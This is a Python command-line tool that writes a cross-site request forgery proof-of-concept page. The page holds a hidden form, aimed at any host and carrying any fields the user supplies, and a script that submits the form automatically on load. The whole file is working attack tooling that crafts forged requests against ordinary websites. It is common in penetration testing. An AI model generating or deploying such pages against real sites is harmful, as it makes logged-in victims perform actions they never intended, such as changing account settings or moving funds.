from dominate.tags import *
import sys

colors = {"black": "\x1b[30m", "red": "\x1b[31m", "green": "\x1b[32m", "yellow": "\x1b[33m", "blue": "\x1b[34m",
          "magenta": "\x1b[35m", "cyan": "\x1b[36m", "white": "\x1b[37m", "reset": "\x1b[0m"}


def generate_csrf_exploit(args):
    main_html = html(encoding=None)
    html_body = body()
    main_html.add(html_body)
    host = args['host']

    inputs_form = form(action=host, method=args['method'])

    for key in args.keys():
        if key != "method" and key != "host":
            inputs_form.add(input_(type="hidden", name=key, value=args[key]))
    html_body.add(inputs_form)

    js = script("document.forms[0].submit();")
    html_body.add(js)

    with open("CSRF-Exploit.html", "w", encoding=None) as exploit:
        exploit.write(main_html.render(indent="\t", xhtml=False))
        print(colors['green'])
        print("[*] Html code is successfully generated in CSRF-Exploit.html")
        print(colors['reset'])


def main():
    if len(sys.argv) < 3:
        print(colors['red'], end="")
        print("[*] Wrong tool usage!!")
        print(colors['reset'], end="")
        print("[*] Please provide a host and at least one input")
        print(f"[*] Example usage: {sys.argv[0]} https://example.com example=value ")
        exit()
    else:
        host = sys.argv[1]
        args = {"host": host, "method": "POST"}
        for arg in sys.argv[2:]:
            arg = arg.split("=")
            if len(arg) == 1:
                print(colors['red'])
                print("[*] Wrong input format was used")
                print("[*] The correct input format is: name=value")
                print(colors['reset'])
                exit()
            else:
                if arg[0] == "method":
                    args["method"] = arg[1]
                else:
                    args[arg[0]] = arg[1]

    generate_csrf_exploit(args)


if __name__ == '__main__':
    main()
